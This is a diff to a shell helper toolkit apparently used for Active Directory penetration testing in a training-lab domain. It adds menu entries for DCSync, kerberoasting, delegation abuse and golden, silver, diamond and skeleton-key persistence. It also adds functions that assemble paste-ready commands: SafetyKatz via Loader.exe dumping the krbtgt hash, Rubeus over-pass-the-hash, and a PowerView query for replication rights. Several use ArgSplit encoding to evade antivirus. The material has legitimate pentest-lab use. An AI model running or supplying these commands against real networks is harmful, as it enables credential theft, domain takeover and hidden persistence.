@@ -12,29 +12,105 @@ The nb-ad-pwsh namespace contains commands for powershell/powerviwe commands to 
 
 PowerView Enumeration
 ---------------------
-nb-ad-pwsh-enum-domain                     PowerView domain enumeration commands
-nb-ad-pwsh-enum-userhunt                   PowerView user session hunting enumeration commands
-nb-ad-pwsh-enum-users                      PowerView user and computer enumeration commands
+nb-ad-pwsh-enum-domain         PowerView domain enumeration commands
+nb-ad-pwsh-enum-userhunt       PowerView user session hunting enumeration commands
+nb-ad-pwsh-enum-users          PowerView user and computer enumeration commands
+nb-ad-pwsh-enum-dcsync         Powerview user replication reights enumeration
 
-PowerShell Commands
--------------------
-nb-ad-pwsh-psremoting                      connect via PSRemoting to a target host
-nb-ad-pwsh-av-bypass                       AV evasion powershell commands
-nb-ad-pwsh-file-download                   select one of general commands to download a payload into a target machine
-nb-ad-pwsh-dump-secrets                    dump secrets on windows machine using Invoke-Mimi.ps1
+Lateral Movement
+----------------
+nb-ad-pwsh-psremoting          connect via PSRemoting to a target host
+nb-ad-pwsh-av-bypass           AV evasion powershell commands
+nb-ad-pwsh-file-download       select one of general commands to download a payload into a target machine
+nb-ad-pwsh-dump-secrets        dump secrets on windows machine using Invoke-Mimi.ps1
 
+Domain Privilege Escalation
+---------------------------
+nb-ad-pwsh-opth                execute over-pass-the-hash with Rubeus
+nb-ad-pwsh-dcsync              execute DCSync attack with SafetyKatz for krbtgt user
+nb-ad-pwsh-kerberoasting       kerberoasting
+nb-ad-pwsh-unconstrained       unconstrained delegation
+nb-ad-pwsh-constrained         constrained delegation
+nb-ad-pwsh-rbcd                resource-based constrained delegation
 
+Privilege Escalation to Enterprise Admins
+-----------------------------------------
+nb-ad-pwsh-trust-tickets       across trusts - child to parent using trust tickets
+nb-ad-pwsh-krbtgt-hash         across trusts - child to parent using krbtgt hash
 
-Cmd Commands
-------------
-nb-ad-cmd-winrs                connect via winrs to a target host
+Domain Persistence
+------------------
+nb-ad-pwsh-persist-dcsync      add dcsync rights to a user
+nb-ad-pwsh-persist-golden      create a golden ticket
+nb-ad-pwsh-persist-silver      create a silver ticket
+nb-ad-pwsh-persist-diamond     create a diamond ticket
+nb-ad-pwsh-persist-skeleton    create a skeleton key
+nb-ad-pwsh-persist-dsrm        persistence through DSRM
 
 Misc
 ----
+nb-ad-cmd-winrs                connect via winrs to a target host
 nb-ad-pwsh-ping                sweep a network subnet with ping requests on windows powershell
 nb-ad-cmd-ping                 sweep a network subnet with ping requests on windows
 
 DOC
+}
+
+nb-ad-pwsh-enum-dcsync() {
+    __warn "Load PowerView with:"
+    __ok ". .\\PowerView.ps1"
+    __ok "nb-pwsh-file-download    - Execute in memory"
+
+    echo
+    __ask "Enter user to check for DCsync rights"
+    nb-vars-set-user
+
+    __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
+    local dn && __askvar dn DN
+
+    __COMMAND="Get-DomainObjectAcl -SearchBase \"${dn}\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty 'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match \"${__USER}\"}"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+}
+
+nb-ad-pwsh-dcsync() {
+    __check-project
+    __ask "Enter AES256 version of the hash"
+    __check-hash
+
+    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __ok "lsadump::dcsync"
+    __info "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\krbtgt\" \"exit\""
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+}
+
+nb-ad-pwsh-opth() {
+    __check-project
+    nb-vars-set-user
+    __ask "Enter AES256 version of the hash"
+    __check-hash
+
+    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __ok "asktgt"
+    __info "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /domain:dollarcorp.moneycorp.local /user:${__USER} /aes256:${__HASH} /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
 }
 
 nb-ad-pwsh-enum-users() {
@@ -97,7 +173,9 @@ nb-ad-pwsh-enum-userhunt() {
     case $choice in
         1) __COMMAND="Invoke-EnumerateLocalAdmin | select ComputerName, AccountName, IsDomain, IsAdmin";;
         2) __COMMAND="Find-LocalAdminAccess";;
-        3) __COMMAND=". C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1; Find-PSRemotingLocalAdminAccess";;
+        3) nb-vars-set-domain
+          __COMMAND=". C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1; Find-PSRemotingLocalAdminAccess -Domain ${__DOMAIN} -Verbose"
+          ;;
         4) __COMMAND="Find-DomainUserLocation";;
         5) return;;
         *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-userhunt; return;;
